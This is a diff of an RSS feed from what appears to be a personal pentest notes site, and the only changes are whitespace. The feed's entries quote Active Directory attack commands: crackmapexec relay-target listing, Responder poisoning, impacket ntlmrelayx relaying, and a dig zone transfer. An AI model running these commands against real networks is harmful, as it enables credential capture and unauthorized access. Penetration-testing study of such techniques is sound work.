@@ -16,7 +16,7 @@ crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt Then edit responder
 sudo vim /usr/share/responder/responder.conf Turn off the SMB and HTTP option, then run
 sudo responder -I ppp0 -v Once the responder is up, you can run ntlm relay attack using impacket tools
 ntlmrelayx.py -t 192.168.64.129 -smb2support ntlmrelayx.py -tf targets.txt -smb2support -i More about it :
-viperone blog fox-it NTLM-Relay One-Shot The hacker (192.</description>
+ viperone blog fox-it      NTLM-Relay One-Shot The hacker (192.</description>
     </item>
     
     <item>
@@ -25,7 +25,7 @@ viperone blog fox-it NTLM-Relay One-Shot The hacker (192.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://AlrikRr.github.io/notes/active-directory/attacks/dns/</guid>
-      <description> Zone Transfer dig axfr xyz.local@dc01.xyz.local </description>
+      <description>Zone Transfer dig axfr xyz.local@dc01.xyz.local     </description>
     </item>
     
     
